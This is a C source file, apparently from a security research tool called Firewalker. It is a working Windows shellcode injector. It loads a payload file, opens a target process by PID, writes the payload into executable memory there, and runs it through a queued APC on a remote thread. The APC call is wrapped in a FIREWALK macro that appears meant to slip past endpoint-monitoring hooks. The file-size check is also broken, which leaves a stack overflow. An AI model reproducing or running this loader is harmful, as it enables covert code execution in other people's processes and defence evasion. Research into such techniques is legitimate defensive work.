#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <Windows.h>
#include "..\lib\Firewalker.h"

typedef NTSTATUS(NTAPI* FUNC_NTALERTRESUMETHREAD)(
    IN HANDLE ThreadHandle,
    OUT PULONG SuspendCount
    );

FUNC_NTALERTRESUMETHREAD NtAlertResumeThread = (FUNC_NTALERTRESUMETHREAD)GetProcAddress(GetModuleHandle(L"ntdll"), "NtAlertResumeThread");

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("Usage: %s <payload> <pid>\n", argv[0]);
        return 1;
    }

    FILE* fp = fopen(argv[1], "rb");
    if (!fp)
    {
        printf("Payload file %s doesn't exist\n", argv[1]);
        return 1;
    }

    BYTE rgbPayload[8192] = { 0 };

    fseek(fp, 0, SEEK_END);
    long lFileSize = ftell(fp);
    rewind(fp);

    if (!lFileSize > sizeof(rgbPayload))
    {
        printf("File too large\n");
        return 1;
    }

    if (fread(rgbPayload, 1, lFileSize, fp) != lFileSize)
    {
        printf("Error reading file\n");
        return 1;
    }

    fclose(fp);

    DWORD dwPid = atoi(argv[2]);

    printf("About to open process\n");
    getchar();

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (!hProcess)
    {
        printf("Error opening process\n");
        return 1;
    }

    printf("About to alloc memory\n");
    getchar();

    LPVOID lpvRemote = VirtualAllocEx(hProcess, NULL, 8192, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpvRemote)
    {
        printf("Unable to allocate remote memory\n");
        return 1;
    }

    printf("About to write memory\n");
    getchar();

    SIZE_T BytesWritten = 0;

    if (!WriteProcessMemory(hProcess, lpvRemote, rgbPayload, lFileSize, &BytesWritten))
    {
        printf("Unable to write memory\n");
        return 1;
    }

    printf("About to create thread\n");
    getchar();

    HANDLE hRemoteThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlExitUserThread"),
        0,
        CREATE_SUSPENDED,
        NULL,
        NULL
    );

    if(!hRemoteThread)
    {
        printf("Unable to create remote thread\n");
        return 1;
    }

    printf("About to queue APC\n");
    getchar();
    
    if (!FIREWALK(QueueUserAPC((PAPCFUNC)lpvRemote, hRemoteThread, NULL)))
    {
        printf("QueueUserAPC failed\n");
        return 1;
    }
	
    printf("About to NtAlertResumeThread\n");
    getchar();

    ULONG ulSC = 0;

    if (NtAlertResumeThread(hRemoteThread, &ulSC) != 0)
    {
        printf("NtAlertResumeThread failed\n");
        return 1;
    }

    printf("Done\n");

    return 0;
}